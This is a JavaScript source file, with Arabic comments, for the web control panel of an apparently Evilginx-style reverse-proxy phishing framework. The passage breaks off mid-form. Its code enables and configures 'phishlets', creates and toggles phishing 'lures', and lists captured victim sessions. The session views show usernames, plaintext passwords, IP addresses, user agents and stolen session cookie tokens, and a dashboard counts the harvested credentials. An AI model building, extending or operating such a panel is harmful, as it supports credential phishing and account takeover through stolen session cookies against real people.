// العناصر الرئيسية في واجهة المستخدم
const sidebar = document.querySelector('.sidebar');
const content = document.querySelector('.content');
const menuToggle = document.querySelector('.menu-toggle');
const navLinks = document.querySelectorAll('.sidebar-nav a');
const tabContents = document.querySelectorAll('.tab-content');
const logoutBtn = document.getElementById('logout-btn');

// العناصر الخاصة بالتبويبات المختلفة
const phishletsTable = document.getElementById('phishlets-table');
const luresTable = document.getElementById('lures-table');
const sessionsTable = document.getElementById('sessions-table');
const phishletsRefreshBtn = document.getElementById('refresh-phishlets');
const luresRefreshBtn = document.getElementById('refresh-lures');
const sessionsRefreshBtn = document.getElementById('refresh-sessions');
const createLureBtn = document.getElementById('create-lure-btn');
const lastUpdatedSpan = document.querySelector('.last-updated');

// إحصائيات الداشبورد
const phishletsCountElement = document.getElementById('phishlets-count');
const luresCountElement = document.getElementById('lures-count');
const sessionsCountElement = document.getElementById('sessions-count');
const credentialsCountElement = document.getElementById('credentials-count');

// عنوان API الأساسي
const API_BASE_URL = window.location.origin + '/api';

// متغيرات عامة
let authToken = localStorage.getItem('authToken');
let phishlets = [];
let lures = [];
let sessions = [];
let credentials = [];

// التحقق من حالة تسجيل الدخول
function checkAuthentication() {
    if (!authToken) {
        window.location.href = '/login';
    }
}

// إضافة الهيدر الخاص بالمصادقة إلى طلبات API
function getHeaders() {
    return {
        'Authorization': authToken,
        'Content-Type': 'application/json'
    };
}

// دالة للتعامل مع الأخطاء
function handleApiError(error) {
    console.error('API Error:', error);
    if (error.status === 401) {
        // تسجيل الخروج إذا كانت المصادقة غير صالحة
        localStorage.removeItem('authToken');
        window.location.href = '/login';
    }
    showToast('خطأ', error.message || 'حدث خطأ أثناء الاتصال بالخادم', 'error');
}

// دالة لتحديث الوقت
function updateLastUpdated() {
    const now = new Date();
    const options = {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    lastUpdatedSpan.textContent = now.toLocaleTimeString('ar-SA', options);
}

// إظهار رسالة تنبيه
function showToast(title, message, type = 'info') {
    const toaster = document.querySelector('.toaster') || createToaster();
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    let icon = '';
    switch(type) {
        case 'success': icon = 'fas fa-check-circle'; break;
        case 'error': icon = 'fas fa-exclamation-circle'; break;
        case 'warning': icon = 'fas fa-exclamation-triangle'; break;
        default: icon = 'fas fa-info-circle';
    }
    
    toast.innerHTML = `
        <div class="toast-icon"><i class="${icon}"></i></div>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close"><i class="fas fa-times"></i></button>
    `;
    
    toaster.appendChild(toast);
    
    // إزالة التنبيه بعد 5 ثواني
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toaster.removeChild(toast);
        }, 300);
    }, 5000);
    
    // زر إغلاق التنبيه
    toast.querySelector('.toast-close').addEventListener('click', () => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toaster.removeChild(toast);
        }, 300);
    });
}

// إنشاء حاوية التنبيهات إذا لم تكن موجودة
function createToaster() {
    const toaster = document.createElement('div');
    toaster.className = 'toaster';
    document.body.appendChild(toaster);
    return toaster;
}

// ================= API Calls =================

// جلب قائمة الـ Phishlets
async function fetchPhishlets() {
    try {
        const response = await fetch(`${API_BASE_URL}/phishlets`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب قائمة الـ Phishlets'
            };
        }
        
        const result = await response.json();
        // تجهيز البيانات بالتنسيق المناسب
        phishlets = Array.isArray(result) ? result : (result.data || []);
        console.log('تم استلام Phishlets:', phishlets);
        return phishlets;
    } catch (error) {
        console.error('خطأ في جلب Phishlets:', error);
        handleApiError(error);
        return [];
    }
}

// جلب قائمة الـ Lures
async function fetchLures() {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب قائمة الـ Lures'
            };
        }
        
        const result = await response.json();
        // تجهيز البيانات بالتنسيق المناسب
        lures = Array.isArray(result) ? result : (result.data || []);
        console.log('تم استلام Lures:', lures);
        return lures;
    } catch (error) {
        console.error('خطأ في جلب Lures:', error);
        handleApiError(error);
        return [];
    }
}

// جلب قائمة الـ Sessions
async function fetchSessions() {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب قائمة الـ Sessions'
            };
        }
        
        const result = await response.json();
        console.log('استجابة API الأصلية للجلسات:', result);
        
        // تجهيز البيانات بالتنسيق المناسب
        // تحقق من تنسيق البيانات المستلمة وتحويلها إلى تنسيق موحد
        sessions = [];
        
        if (Array.isArray(result)) {
            sessions = result;
        } else if (result.data && Array.isArray(result.data)) {
            sessions = result.data;
        } else if (typeof result === 'object') {
            // إذا كان الرد كائن يحتوي على جلسات
            const possibleArrayKeys = ['sessions', 'data', 'records', 'items'];
            for (const key of possibleArrayKeys) {
                if (result[key] && Array.isArray(result[key])) {
                    sessions = result[key];
                    break;
                }
            }
            
            // إذا لم نجد مصفوفة، ربما البيانات مخزنة كقيم في الكائن
            if (sessions.length === 0) {
                const sessionIds = Object.keys(result);
                sessions = sessionIds.map(id => {
                    const session = result[id];
                    if (typeof session === 'object') {
                        session.id = id;
                        return session;
                    }
                    return null;
                }).filter(session => session !== null);
            }
        }
        
        console.log('البيانات المعالجة للجلسات:', sessions);
        return sessions;
    } catch (error) {
        console.error('خطأ في جلب Sessions:', error);
        handleApiError(error);
        return [];
    }
}

// تفعيل أو تعطيل الـ Phishlet
async function togglePhishlet(name, enable) {
    try {
        console.log(`محاولة ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${name}`);
        
        // إذا كنا نحاول تفعيل، نتحقق أولاً مما إذا كان له hostname مضبوط
        if (enable) {
            // الحصول على معلومات الـ phishlet
            const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
                method: 'GET',
                headers: getHeaders()
            });
            
            if (!phishletResponse.ok) {
                throw new Error(`فشل في الحصول على معلومات الـ Phishlet: ${phishletResponse.statusText}`);
            }
            
            const phishletData = await phishletResponse.json();
            console.log(`بيانات الـ Phishlet ${name}:`, phishletData);
            
            // التحقق مما إذا كان الـ phishlet يحتاج إلى hostname
            if (!phishletData.data.hostname || phishletData.data.hostname === "") {
                // إظهار مربع حوار لطلب hostname
                const hostname = await showHostnamePrompt(name);
                if (!hostname) {
                    // المستخدم ألغى العملية
                    return false;
                }
                
                // تحديث hostname للـ phishlet
                const hostnameResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
                    method: 'POST',
                    headers: getHeaders(),
                    body: JSON.stringify({
                        phishlet: name,
                        hostname: hostname
                    })
                });
                
                if (!hostnameResponse.ok) {
                    const errorText = await hostnameResponse.text();
                    let errorMessage = hostnameResponse.statusText;
                    
                    try {
                        const errorData = JSON.parse(errorText);
                        if (errorData.message) {
                            errorMessage = errorData.message;
                        }
                    } catch (e) {
                        console.error("خطأ في تحليل استجابة الخطأ:", e);
                    }
                    
                    throw new Error(`فشل في تعيين hostname: ${errorMessage}`);
                }
                
                console.log(`تم تعيين hostname بنجاح للـ phishlet ${name}`);
            }
        }
        
        // الآن نقوم بتفعيل/تعطيل الـ phishlet
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        // تسجيل الاستجابة كاملة للتصحيح
        console.log(`استجابة ${action} للـ phishlet:`, response);
        
        if (!response.ok) {
            const errorText = await response.text();
            let errorMessage = response.statusText;
            
            try {
                const errorData = JSON.parse(errorText);
                if (errorData.message) {
                    errorMessage = errorData.message;
                }
            } catch (e) {
                console.error("خطأ في تحليل استجابة الخطأ:", e);
            }
            
            throw new Error(`فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ phishlet: ${errorMessage}`);
        }
        
        const data = await response.json();
        console.log(`بيانات استجابة ${action} للـ phishlet:`, data);
        
        if (data.success) {
            showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet ${name} بنجاح`, 'success');
            
            // التحقق مما إذا كانت الملفات قد تم حفظها
            await checkConfigSaved();
            
            return true;
        } else {
            showToast('خطأ', `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${data.message || 'خطأ غير معروف'}`, 'error');
            return false;
        }
    } catch (error) {
        console.error(`خطأ في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, error);
        showToast('خطأ', `حدث خطأ: ${error.message}`, 'error');
        return false;
    }
}

// عرض مربع حوار لطلب hostname
async function showHostnamePrompt(phishletName) {
    return new Promise((resolve) => {
        // إنشاء العناصر
        const modal = document.createElement('div');
        modal.className = 'modal active';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h3>تعيين Hostname للـ Phishlet</h3>
                    <button class="modal-close">&times;</button>
                </div>
                <div class="modal-body">
                    <p>يجب إدخال hostname لتفعيل الـ phishlet "${phishletName}"</p>
                    <div class="form-group">
                        <label for="hostname-input">Hostname</label>
                        <input type="text" id="hostname-input" class="form-control" placeholder="example.yourdomain.com">
                        <small class="form-text">
                            أدخل النطاق الفرعي الذي سيستخدم للـ phishlet. 
                            تأكد من أن هذا النطاق يشير إلى خادمك.
                        </small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary cancel-btn">إلغاء</button>
                    <button class="btn btn-primary save-btn">حفظ</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        
        // التركيز على حقل الإدخال
        const input = modal.querySelector('#hostname-input');
        setTimeout(() => input.focus(), 100);
        
        // إضافة معالجات الأحداث
        const closeBtn = modal.querySelector('.modal-close');
        const cancelBtn = modal.querySelector('.cancel-btn');
        const saveBtn = modal.querySelector('.save-btn');
        
        const close = (result) => {
            document.body.removeChild(modal);
            resolve(result);
        };
        
        closeBtn.addEventListener('click', () => close(null));
        cancelBtn.addEventListener('click', () => close(null));
        
        saveBtn.addEventListener('click', () => {
            const hostname = input.value.trim();
            if (!hostname) {
                showToast('خطأ', 'يرجى إدخال hostname صالح', 'error');
                return;
            }
            close(hostname);
        });
        
        // معالجة ضغط Enter في حقل الإدخال
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                saveBtn.click();
            }
        });
    });
}

// التحقق مما إذا كانت التغييرات قد تم حفظها
async function checkConfigSaved() {
    try {
        // طلب لحفظ التكوين
        const response = await fetch(`${API_BASE_URL}/config/save`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        const data = await response.json();
        console.log('استجابة حفظ التكوين:', data);
        
        if (data.success) {
            console.log('تم حفظ التكوين بنجاح');
            return true;
        } else {
            console.warn('فشل حفظ التكوين:', data.message);
            return false;
        }
    } catch (error) {
        console.error('خطأ في حفظ التكوين:', error);
        return false;
    }
}

// عرض نافذة مودال لإدخال hostname
function showHostnameModal(phishletName, callback) {
    // إنشاء عناصر المودال
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>إعداد Hostname للـ Phishlet</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <p>يجب إدخال hostname لتفعيل الـ phishlet "${phishletName}"</p>
                <div class="form-group">
                    <label for="phishlet-hostname">Hostname</label>
                    <input type="text" id="phishlet-hostname" class="form-control" placeholder="example.yourdomain.com">
                    <small class="form-text">
                        أدخل اسم النطاق الكامل الذي سيستخدم لهذا الـ phishlet. 
                        تأكد من أن هذا النطاق مسجل ويشير إلى خادمك.
                    </small>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-secondary modal-cancel-btn">إلغاء</button>
                <button class="btn-primary modal-save-btn">حفظ وتفعيل</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // إضافة معالجات الأحداث
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-cancel-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
            callback(null); // إلغاء العملية
        });
    });
    
    const saveButton = modal.querySelector('.modal-save-btn');
    saveButton.addEventListener('click', function() {
        const hostname = modal.querySelector('#phishlet-hostname').value.trim();
        if (!hostname) {
            showToast('خطأ', 'يجب إدخال hostname', 'error');
            return;
        }
        document.body.removeChild(modal);
        callback(hostname);
    });
    
    // التركيز على حقل الإدخال
    setTimeout(() => {
        modal.querySelector('#phishlet-hostname').focus();
    }, 100);
}

// إنشاء Lure جديد
async function createLure(lureData) {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify(lureData)
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في إنشاء الـ Lure'
            };
        }
        
        showToast('تم بنجاح', 'تم إنشاء Lure جديد بنجاح', 'success');
        return await response.json();
    } catch (error) {
        handleApiError(error);
        return null;
    }
}

// حذف Lure
async function deleteLure(id) {
    try {
        console.log(`محاولة حذف Lure بالمعرف ${id}`);
        
        const response = await fetch(`${API_BASE_URL}/lures/${id}`, {
            method: 'DELETE',
            headers: getHeaders()
        });
        
        console.log('استجابة حذف Lure:', response);
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في حذف الـ Lure'
            };
        }
        
        // محاولة قراءة الاستجابة كـ JSON
        let responseData;
        try {
            responseData = await response.json();
            console.log('بيانات استجابة حذف Lure:', responseData);
        } catch (e) {
            console.log('لا يمكن قراءة استجابة الحذف كـ JSON', e);
        }
        
        return true;
    } catch (error) {
        console.error('خطأ أثناء حذف Lure:', error);
        handleApiError(error);
        return false;
    }
}

// جلب تفاصيل Session
async function fetchSessionDetails(id) {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions/${id}`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب تفاصيل الـ Session'
            };
        }
        
        const responseJson = await response.json();
        console.log('استجابة تفاصيل الجلسة:', responseJson);
        
        // استخراج البيانات من حقل Data في الاستجابة
        if (responseJson.success && responseJson.data) {
            return responseJson.data;
        }
        
        return null;
    } catch (error) {
        handleApiError(error);
        return null;
    }
}

// تفعيل أو تعطيل الـ Lure
async function toggleLure(id, enable) {
    try {
        console.log(`محاولة ${enable ? 'تفعيل' : 'تعطيل'} Lure بالمعرف ${id}`);
        
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/lures/${id}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        console.log(`استجابة ${enable ? 'تفعيل' : 'تعطيل'} Lure:`, response);
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure`
            };
        }
        
        // محاولة قراءة الاستجابة كـ JSON
        let responseData;
        try {
            responseData = await response.json();
            console.log(`بيانات استجابة ${enable ? 'تفعيل' : 'تعطيل'} Lure:`, responseData);
        } catch (e) {
            console.log('لا يمكن قراءة الاستجابة كـ JSON', e);
        }
        
        showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure بنجاح`, 'success');
        return true;
    } catch (error) {
        console.error(`خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} Lure:`, error);
        handleApiError(error);
        return false;
    }
}

// ================= UI Functions =================

// تحديث لوحة القيادة
async function updateDashboard() {
    try {
        updateLastUpdated();
        
        // جلب البيانات من API
        const [phishletsData, luresData, sessionsData] = await Promise.all([
            fetchPhishlets(),
            fetchLures(),
            fetchSessions()
        ]);
        
        // تحديث الإحصائيات
        phishletsCountElement.textContent = phishletsData.length;
        luresCountElement.textContent = luresData.length;
        sessionsCountElement.textContent = sessionsData.length;
        
        // حساب عدد بيانات الاعتماد المسجلة
        let credCount = 0;
        sessionsData.forEach(session => {
            if (session.tokens && Object.keys(session.tokens).length > 0) {
                credCount++;
            }
        });
        credentialsCountElement.textContent = credCount;
        
        // تحديث جدول الجلسات الأخيرة
        const recentSessionsTable = document.getElementById('recent-sessions-table');
        if (recentSessionsTable) {
            populateRecentSessionsTable(recentSessionsTable, sessionsData.slice(0, 5));
        }
        
    } catch (error) {
        console.error('Error updating dashboard:', error);
        showToast('خطأ', 'فشل في تحديث لوحة القيادة', 'error');
    }
}

// تعبئة جدول الجلسات الأخيرة
function populateRecentSessionsTable(tableElement, sessions) {
    const tbody = tableElement.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!sessions || sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد جلسات مسجلة</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    sessions.forEach(session => {
        // التأكد من وجود كافة البيانات الضرورية
        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'غير معروف';
        const phishlet = session.phishlet || session.Phishlet || '';
        const username = session.username || session.Username || session.user || session.User || session.login || 'غير مسجل';
        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'غير معروف';
        
        // محاولة العثور على وقت الإنشاء، قد يكون في عدة حقول مختلفة
        let created = null;
        if (session.create_time) created = session.create_time * 1000; // تحويل من ثواني إلى مللي ثانية
        else if (session.CreateTime) created = session.CreateTime * 1000;
        else if (session.created) created = session.created;
        else if (session.timestamp) created = session.timestamp;
        else if (session.time) created = session.time;
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${sessionId}</td>
            <td>${phishlet}</td>
            <td>${username}</td>
            <td>${ip}</td>
            <td>${formatDate(created)}</td>
        `;
        tbody.appendChild(tr);
    });
}

// تعبئة جدول الـ Phishlets
function populatePhishletsTable(phishlets) {
    const tbody = phishletsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!phishlets || phishlets.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد phishlets</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('بيانات الـ Phishlets المستلمة:', phishlets);
    
    phishlets.forEach(phishlet => {
        const tr = document.createElement('tr');
        // تأكد من أن جميع الخصائص المطلوبة موجودة
        const name = phishlet.name || phishlet.id || '';
        const author = phishlet.author || '';
        const hostname = phishlet.hostname || '';
        
        // التحقق من حالة التفعيل - يمكن أن تكون في أي من هذه الحقول
        const enabled = phishlet.is_active === true || phishlet.isActive === true || phishlet.IsActive === true || phishlet.enabled === true;
        
        tr.innerHTML = `
            <td>${name}</td>
            <td>${author}</td>
            <td>${hostname || 'غير محدد'}</td>
            <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'مفعل' : 'معطل'}</span></td>
            <td class="action-buttons">
                <button class="btn btn-sm ${enabled ? 'btn-danger' : 'btn-success'}" data-action="${enabled ? 'disable' : 'enable'}" data-name="${name}">
                    <i class="fas fa-${enabled ? 'power-off' : 'play'}"></i>
                    ${enabled ? 'تعطيل' : 'تفعيل'}
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // إضافة معالجات الأحداث لأزرار التفعيل/التعطيل
    const actionButtons = tbody.querySelectorAll('[data-action]');
    actionButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const name = this.dataset.name;
            const action = this.dataset.action;
            
            if (action === 'enable') {
                await togglePhishlet(name, true);
            } else {
                await togglePhishlet(name, false);
            }
            
            // تحديث جدول الـ Phishlets
            const updatedPhishlets = await fetchPhishlets();
            populatePhishletsTable(updatedPhishlets);
        });
    });
}

// تعبئة جدول الـ Lures
function populateLuresTable(lures) {
    const tbody = luresTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!lures || lures.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="6" class="text-center">لا توجد lures</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('بيانات الـ Lures الكاملة:', lures);
    
    lures.forEach((lure, index) => {
        // التأكد من وجود كافة البيانات الضرورية
        const id = lure.id || index;
        const phishlet = lure.phishlet || '';
        const hostname = lure.hostname || '';
        const path = lure.path || '/';
        const redirectUrl = lure.redirect_url || lure.RedirectUrl || '';
        
        // التحقق مما إذا كان الـ lure مفعّلًا أو معطّلًا
        const isEnabled = !lure.PausedUntil || lure.PausedUntil === 0 || lure.PausedUntil < Date.now()/1000;
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${id}</td>
            <td>${phishlet}</td>
            <td>${hostname}</td>
            <td>${path}</td>
            <td>${redirectUrl}</td>
            <td>
                <span class="badge ${isEnabled ? 'badge-success' : 'badge-danger'}">
                    ${isEnabled ? 'مفعّل' : 'معطّل'}
                </span>
            </td>
            <td class="action-buttons">
                <button class="btn btn-sm ${isEnabled ? 'btn-danger' : 'btn-success'} toggle-lure-btn" data-index="${index}" data-action="${isEnabled ? 'disable' : 'enable'}">
                    <i class="fas fa-${isEnabled ? 'power-off' : 'play'}"></i>
                    ${isEnabled ? 'تعطيل' : 'تفعيل'}
                </button>
                <button class="btn btn-sm btn-danger delete-lure-btn" data-index="${index}">
                    <i class="fas fa-trash-alt"></i> حذف
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // إضافة معالجات الأحداث لأزرار التفعيل/التعطيل
    const toggleButtons = tbody.querySelectorAll('.toggle-lure-btn');
    toggleButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const index = Number(this.dataset.index);
            const action = this.dataset.action;
            const enable = action === 'enable';
            
            try {
                // عرض رسالة انتظار
                showToast('جاري التنفيذ', `جاري ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure...`, 'info');
                
                // محاولة تفعيل/تعطيل الـ lure
                const success = await toggleLure(index, enable);
                
                if (success) {
                    // تحديث جدول الـ Lures
                    const updatedLures = await fetchLures();
                    populateLuresTable(updatedLures);
                }
            } catch (error) {
                console.error(`خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure:`, error);
                showToast('خطأ', `حدث خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure`, 'error');
            }
        });
    });
    
    // إضافة معالجات الأحداث لأزرار الحذف
    const deleteButtons = tbody.querySelectorAll('.delete-lure-btn');
    deleteButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const index = Number(this.dataset.index);
            if (confirm('هل أنت متأكد من حذف هذا الـ Lure؟')) {
                try {
                    // عرض رسالة انتظار
                    showToast('جاري الحذف', 'جاري حذف الـ Lure...', 'info');
                    
                    // محاولة حذف الـ lure
                    const success = await deleteLure(index);
                    
                    if (success) {
                        // تحديث جدول الـ Lures
                        const updatedLures = await fetchLures();
                        populateLuresTable(updatedLures);
                        // تحديث الإحصائيات
                        updateDashboard();
                        
                        showToast('تم بنجاح', 'تم حذف الـ Lure بنجاح', 'success');
                    } else {
                        showToast('خطأ', 'فشل في حذف الـ Lure', 'error');
                    }
                } catch (error) {
                    console.error('خطأ أثناء حذف الـ Lure:', error);
                    showToast('خطأ', 'حدث خطأ أثناء حذف الـ Lure', 'error');
                }
            }
        });
    });
}

// تعبئة جدول الـ Sessions
function populateSessionsTable(sessions) {
    const tbody = sessionsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!sessions || sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="7" class="text-center">لا توجد جلسات مسجلة</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('بيانات الجلسات الكاملة:', sessions);
    
    sessions.forEach(session => {
        // التأكد من وجود كافة البيانات الضرورية باستخدام جميع المسميات المحتملة
        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'غير معروف';
        const phishlet = session.phishlet || session.Phishlet || '';
        const username = session.username || session.Username || session.user || session.User || session.login || 'غير مسجل';
        const password = session.password || session.Password || session.pass || session.Pass || 'غير مسجلة';
        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'غير معروف';
        
        // محاولة العثور على وقت الإنشاء، قد يكون في عدة حقول مختلفة
        let created = null;
        if (session.create_time) created = session.create_time * 1000; // تحويل من ثواني إلى مللي ثانية
        else if (session.CreateTime) created = session.CreateTime * 1000;
        else if (session.created) created = session.created;
        else if (session.timestamp) created = session.timestamp;
        else if (session.time) created = session.time;
        
        // التحقق من وجود رموز أو بيانات اعتماد
        const hasCredentials = (
            (session.tokens && Object.keys(session.tokens).length > 0) || 
            (session.Tokens && Object.keys(session.Tokens).length > 0) ||
            (session.CookieTokens && Object.keys(session.CookieTokens).length > 0) ||
            username !== 'غير مسجل' || 
            password !== 'غير مسجلة'
        );
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${sessionId}</td>
            <td>${phishlet}</td>
            <td>${username}</td>
            <td>${password}</td>
            <td>${ip}</td>
            <td>${formatDate(created)}</td>
            <td class="action-buttons">
                <button class="btn btn-sm btn-primary" data-action="view" data-id="${sessionId}">
                    <i class="fas fa-eye"></i> عرض
                </button>
                ${hasCredentials ? `<span class="badge badge-success">بيانات اعتماد</span>` : ''}
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // إضافة معالجات الأحداث لأزرار العرض
    const viewButtons = tbody.querySelectorAll('[data-action="view"]');
    viewButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const id = this.dataset.id;
            await showSessionDetails(id);
        });
    });
}

// عرض تفاصيل الجلسة
async function showSessionDetails(id) {
    // إنشاء النافذة المنبثقة
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content modal-lg">
            <div class="modal-header">
                <h3>تفاصيل الجلسة</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <div class="session-details">
                    <div class="loading-spinner">
                        <div class="spinner"></div>
                        <p style="margin-top: 10px;">جاري تحميل البيانات...</p>
                    </div>
                    <div class="session-info"></div>
                    <div class="tokens-section">
                        <h4>بيانات الاعتماد والرموز</h4>
                        <div class="tokens-container"></div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary modal-close-btn">إغلاق</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // إضافة معالجات الأحداث للإغلاق
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
        });
    });
    
    // جلب تفاصيل الجلسة
    try {
        const sessionDetails = await fetchSessionDetails(id);
        const loadingSpinner = modal.querySelector('.loading-spinner');
        loadingSpinner.style.display = 'none';
        
        console.log('تفاصيل الجلسة بعد الاستخراج:', sessionDetails);
        
        if (!sessionDetails) {
            showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
            return;
        }
        
        // تحضير البيانات مع التحقق من وجودها
        const sessionId = sessionDetails.id || sessionDetails.session_id || sessionDetails.SessionId || 'غير معروف';
        const phishlet = sessionDetails.phishlet || 'غير معروف';
        const username = sessionDetails.username || sessionDetails.user || sessionDetails.login || 'غير مسجل';
        const password = sessionDetails.password || sessionDetails.pass || 'غير مسجلة';
        const ip = sessionDetails.remote_addr || sessionDetails.ip || sessionDetails.remote_ip || 'غير معروف';
        const userAgent = sessionDetails.user_agent || sessionDetails.useragent || sessionDetails.UserAgent || 'غير متوفر';
        const created = sessionDetails.created || sessionDetails.timestamp || sessionDetails.time || null;
        
        // عرض معلومات الجلسة
        const sessionInfoElement = modal.querySelector('.session-info');
        sessionInfoElement.innerHTML = `
            <div class="info-item">
                <span class="info-label">معرف الجلسة:</span>
                <span class="info-value">${sessionId}</span>
            </div>
            <div class="info-item">
                <span class="info-label">Phishlet:</span>
                <span class="info-value">${phishlet}</span>
            </div>
            <div class="info-item">
                <span class="info-label">اسم المستخدم:</span>
                <span class="info-value">${username}</span>
            </div>
            <div class="info-item">
                <span class="info-label">كلمة المرور:</span>
                <span class="info-value">${password}</span>
            </div>
            <div class="info-item">
                <span class="info-label">عنوان IP:</span>
                <span class="info-value">${ip}</span>
            </div>
            <div class="info-item">
                <span class="info-label">وكيل المستخدم:</span>
                <span class="info-value">${userAgent}</span>
            </div>
            <div class="info-item">
                <span class="info-label">تاريخ الإنشاء:</span>
                <span class="info-value">${formatDate(created)}</span>
            </div>
        `;
        
        // عرض الرموز والبيانات
        const tokensContainer = modal.querySelector('.tokens-container');
        
        // التحقق من وجود الرموز - قد تكون في أي من هذه الحقول حسب هيكل البيانات
        const tokens = sessionDetails.tokens || sessionDetails.Tokens || sessionDetails.cookies || {};
        
        if (tokens && Object.keys(tokens).length > 0) {
            let tokensHTML = '';
            for (const [key, value] of Object.entries(tokens)) {
                tokensHTML += `
                    <div class="token-item">
                        <div class="token-name">${key}</div>
                        <div class="token-value">${value}</div>
                    </div>
                `;
            }
            tokensContainer.innerHTML = tokensHTML;
        } else {
            tokensContainer.innerHTML = '<p class="no-tokens">لا توجد بيانات اعتماد مسجلة لهذه الجلسة</p>';
        }
        
    } catch (error) {
        console.error('خطأ في جلب تفاصيل الجلسة:', error);
        showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
    }
}

// إظهار نافذة إنشاء Lure جديد
async function showCreateLureModal() {
    // جلب قائمة الـ Phishlets لعرضها في القائمة المنسدلة
    const phishlets = await fetchPhishlets();
    
    console.log('بيانات الـ Phishlets عند إنشاء lure:', phishlets);
    
    // إنشاء النافذة المنبثقة
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>إنشاء Lure جديد</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="create-lure-form">
                    <div class="form-group">
